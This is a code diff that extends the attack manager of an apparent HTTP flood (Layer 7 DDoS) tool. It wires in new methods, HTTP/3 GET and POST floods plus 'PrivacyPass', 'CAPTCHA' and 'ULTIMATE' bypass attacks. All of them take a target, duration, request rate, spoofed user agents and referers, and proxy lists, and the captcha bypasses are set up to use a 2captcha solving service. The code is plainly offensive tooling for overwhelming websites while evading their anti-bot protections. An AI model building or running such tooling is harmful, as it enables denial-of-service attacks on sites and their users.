@@ -47,6 +47,17 @@ import {
     CookieAttack
 } from '../methods/layer7/advanced.js';
 
+import {
+    PrivacyPassBypass,
+    CaptchaBypass,
+    UltimateBypass
+} from '../methods/layer7/privacy-captcha.js';
+
+import {
+    HTTP3Attack,
+    HTTP3PostAttack
+} from '../methods/layer7/http3.js';
+
 /**
  * Attack Manager - Coordinates all attack operations
  */
@@ -323,6 +334,71 @@ export class AttackManager {
                 this.userAgents,
                 this.referers,
                 this.proxies
+            );
+        }
+
+        if (['HTTP3', 'HTTP3-GET'].includes(method)) {
+            return new HTTP3Attack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['HTTP3-POST'].includes(method)) {
+            return new HTTP3PostAttack(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['PRIVACYPASS'].includes(method)) {
+            return new PrivacyPassBypass(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
+            );
+        }
+
+        if (['CAPTCHA'].includes(method)) {
+            return new CaptchaBypass(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies,
+                {
+                    service: '2captcha',
+                    apiKey: process.env.CAPTCHA_API_KEY || '',
+                    enabled: false
+                }
+            );
+        }
+
+        if (['ULTIMATE', 'ULTIMATE-BYPASS'].includes(method)) {
+            return new UltimateBypass(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies,
+                {
+                    service: '2captcha',
+                    apiKey: process.env.CAPTCHA_API_KEY || '',
+                    enabled: false
+                }
             );
         }
 
